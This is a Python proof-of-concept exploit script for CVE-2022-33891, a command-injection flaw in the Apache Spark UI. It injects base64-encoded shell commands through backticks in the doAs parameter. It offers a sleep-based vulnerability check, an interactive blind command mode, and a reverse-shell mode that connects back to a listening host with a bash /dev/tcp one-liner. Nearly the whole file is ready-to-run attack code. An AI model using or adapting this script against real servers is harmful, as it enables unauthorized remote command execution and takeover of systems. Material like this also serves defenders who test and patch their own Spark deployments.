#!/usr/bin/env python3
import requests
import argparse
import base64
import datetime
from colorama import Fore

parser = argparse.ArgumentParser(description='CVE-2022-33891 Python POC Exploit Script')
parser.add_argument('-u', '--url', help='URL to exploit.', required=True)
parser.add_argument('-p', '--port', help='Exploit target\'s port.', required=True)
parser.add_argument('--revshell', default=False, action="store_true", help="Reverse Shell option.")
parser.add_argument('-lh', '--listeninghost', help='Your listening host IP address.')
parser.add_argument('-lp', '--listeningport', help='Your listening host port.')
parser.add_argument('--check', default=False, action="store_true", help="Checks if the target is exploitable with a sleep test")
parser.add_argument('--verbose', default=False, action="store_true", help="Verbose mode")
parser.add_argument('--header', dest="header", action="store", help="Custom header", required=True)

args = parser.parse_args()

header = args.header

headers = {
    'User-Agent': header,
}

# Colors :D
info = (Fore.BLUE + "[*] " + Fore.RESET)
recc = (Fore.YELLOW + "[*] " + Fore.RESET)
good = (Fore.GREEN + "[+] " + Fore.RESET)
important = (Fore.CYAN + "[!] " + Fore.RESET)
printError = (Fore.RED + "[X] " + Fore.RESET)

full_url = f"{args.url}:{args.port}"


def check_for_vuln(url):
    try:
        print(info + "Attempting to connect to site...")
        r = requests.get(f"{url}/?doAs='testing'", allow_redirects=False, headers=headers)
        if args.verbose:
            print(info + f"URL request: {url}/?doAs='testing'")
            print(info + f"Response status code: {r.status_code}")
        if r.status_code != 403:
            print(printError + "No ?doAs= endpoint. Does not look vulnerable.")
            quit(1)
        elif "org.apache.spark.ui" not in r.content.decode("utf-8"):
            print(printError + "Does not look like an Apache Spark server.")
            quit(1)
        else:
            print(important + "Performing sleep test of 10 seconds...")
            t1 = datetime.datetime.now()
            if args.verbose:
                print(info + f"T1: {t1}")
            run_cmd("sleep 10")
            t2 = datetime.datetime.now()
            delta = t2-t1
            if args.verbose:
                print(info + f"T2: {t2}")
                print(info + f"Delta T: {delta.seconds}")
            if delta.seconds not in range(8,12):
                print(printError + "Sleep was less than 10. This target is probably not vulnerable")
            else:
                print(good + "Sleep was 10 seconds! This target is probably vulnerable!")
            exit(0)
    except Exception as e:
        print(printError + str(e))


def cmd_prompt():
    cmd = input("[cve-2022-33891> ")
    return cmd


def base64_encode(cmd):
    try:
        message_bytes = cmd.encode('ascii')
        base64_bytes = base64.b64encode(message_bytes)
        base64_cmd = base64_bytes.decode('ascii')
        return base64_cmd
    except Exception as e:
        print(printError +str(e))


def run_cmd(cmd):
    try:
        if args.verbose:
            print(info + "Command is: " + cmd)
        base64_cmd = base64_encode(cmd)
        if args.verbose:
            print(info + "Base64 command is: " + base64_cmd)
        exploit = f"/?doAs=`echo {base64_cmd} | base64 -d | bash`"
        exploit_req = f"{full_url}{exploit}"
        if args.verbose:
            print(info + "Full exploit request is: " + exploit_req)
            print(info + "Sending exploit...")
        r = requests.get(exploit_req, allow_redirects=False, headers=headers)
        if args.verbose:
            print(info + f"Response status code: {r.status_code}\n"+ info + "Hint: 403 is good.")
    except Exception as e:
        print(printError + str(e))
        quit(1)


def revshell(lhost, lport):
    print(info + f"Reverse shell mode.\n" + recc+ f"Set up your listener by entering the following:\nnc -nvlp {lport}")
    input(recc + "When your listener is set up, press enter!")
    rev_shell_cmd = f"sh -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    run_cmd(rev_shell_cmd)


def main():
    try:
        if args.check and args.revshell:
            print(printError + "Please choose either revshell or check!")
            exit(1)

        elif args.check:
            check_for_vuln(full_url)

        # Revshell
        elif args.revshell:
            if not (args.listeninghost and args.listeningport):
                print(printError + "You need --listeninghost and --listeningport!")
                exit(1)
            else:
                lhost = args.listeninghost
                lport = args.listeningport
                revshell(lhost, lport)
        else:
            # "Interactive" mode
            print(info + "\"Interactive\" mode!\n" + important + "Note: you will not receive any output from these commands. Try using something like ping or sleep to test for execution.")
            while True:
                command_to_run = cmd_prompt()
                run_cmd(command_to_run)
    except KeyboardInterrupt:
        print("\n"+ info + "Goodbye!")


if __name__ == "__main__":
    main()
